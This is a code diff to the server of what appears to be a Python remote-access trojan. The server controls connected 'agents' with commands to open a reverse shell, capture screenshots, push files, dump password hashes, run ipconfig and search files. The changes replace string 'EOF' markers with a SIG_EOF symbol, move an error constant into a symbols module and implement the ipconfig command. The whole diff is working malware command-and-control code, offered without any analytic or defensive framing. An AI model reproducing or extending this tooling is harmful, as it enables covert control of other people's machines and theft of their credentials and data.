@@ -1,8 +1,7 @@
 import socket, threading, ssl
 import secrets, os, platform, json
-from agent import *
-
-ERROR_INSUFFICIENT_PERMS = b'\x98\x90\x90\x30\x22\x11'
+from agent import Agent
+from symbols import *
 
 class Server:
                                                                       
@@ -39,7 +38,7 @@ class Server:
             },
             'shell': {
                 'function': self.shell,
-                'description': 'Open a reverse shell from the selected agent'
+                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell)'
             },
             'screenshot': {
                 'function': self.screenshot,
@@ -208,7 +207,7 @@ class Server:
             with open(screen_path, 'wb') as f:
                 while True:
                     data = self.current_agent.sock.recv(1024)
-                    if (data.decode("latin1") == "EOF") or (not data):
+                    if (data == SIG_EOF) or (not data):
                         break
                     f.write(data)
             print(f'Screenshot saved at {screen_path}')
@@ -226,7 +225,7 @@ class Server:
                     while True:
                         data = self.current_agent.sock.recv(1024)
                         decoded_data = data.decode("latin1")
-                        if (decoded_data == "EOF") or (not data):
+                        if (data == SIG_EOF) or (not data):
                             break
                         if (decoded_data.startswith("ERROR:")):
                             print(decoded_data)
@@ -245,7 +244,7 @@ class Server:
             with open(args[0], 'rb') as f:
                 while (chunk := f.read(1024)):
                     self.current_agent.sock.sendall(chunk)
-            self.current_agent.sock.sendall("EOF".encode())
+            self.current_agent.sock.sendall(SIG_EOF)
             print("File sent to agent")
     
     def isAgentSelected(self):
@@ -296,7 +295,7 @@ class Server:
                 while True:
                     data = self.current_agent.sock.recv(1024)
                     decoded_data = data.decode("latin1")
-                    if (decoded_data == "EOF") or (not data):
+                    if (data == SIG_EOF) or (not data):
                         break
                     elif (data == ERROR_INSUFFICIENT_PERMS):
                         print(f"ERROR: Insufficient permissions to dump hashes.")
@@ -313,7 +312,10 @@ class Server:
                 return agent
     
     def ipconfig(self, args):
-        pass
+        if self.isAgentSelected():
+            self.current_agent.sock.sendall("ipconfig".encode())
+            data = self.current_agent.sock.recv(16384)
+            print(data.decode('utf-8'))
     
     def search(self,args):
         if self.isAgentSelected():
@@ -325,7 +327,7 @@ class Server:
             while True:
                 data = self.current_agent.sock.recv(1024)
                 decoded_data = data.decode("latin1")
-                if (decoded_data == "EOF") or (not data):
+                if (data == SIG_EOF) or (not data):
                     break
                 print('---')
                 print(decoded_data)
